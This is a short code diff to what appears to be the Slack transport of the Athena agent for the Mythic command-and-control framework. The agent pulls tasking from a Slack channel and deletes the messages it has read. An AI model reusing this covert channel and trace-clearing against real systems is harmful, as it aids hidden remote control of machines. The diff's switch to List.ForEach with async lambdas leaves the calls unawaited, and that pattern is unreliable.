@@ -176,7 +176,7 @@ namespace Athena.Config
 
                 //Delete the messages we've read successfully and indicate we're not waiting for a response anymore
                 DeleteMessages(result.Keys.ToList());
-                
+
                 if (this.encrypted)
                 {
                     return this.crypt.Decrypt(json);
@@ -293,13 +293,12 @@ namespace Athena.Config
         private async Task DeleteMessages(List<string> messages)
         {
             // This works for the current implemenation but may have to change in the event I need to further chunk messages.
-            bool success = false;
-            foreach (var message in messages)
+            messages.ForEach(async message =>
             {
                 string data = "{\"channel\":\"" + this.channel + "\",\"ts\":\"" + message + "\"}";
-                success = await SendPost("https://slack.com/api/chat.delete", data);
+                await SendPost("https://slack.com/api/chat.delete", data);
                 await Task.Delay(1000);
-            }
+            });
         }
         private async Task<Dictionary<string, MythicMessageWrapper>> GetSlackMessages()
         {
@@ -328,7 +327,7 @@ namespace Athena.Config
 
                     if (msgResponse is not null && msgResponse.messages is not null) //Try Again
                     {
-                        foreach (var message in msgResponse.messages)
+                        msgResponse.messages.ForEach(async message =>
                         {
                             try
                             {
@@ -349,7 +348,7 @@ namespace Athena.Config
                             catch (Exception e)
                             {
                             }
-                        }
+                        });
 
                         if (messages.Count < 1)
                         {
@@ -600,4 +599,3 @@ namespace Athena.Config
         public FileUploadFile file { get; set; }
     }
 }
-
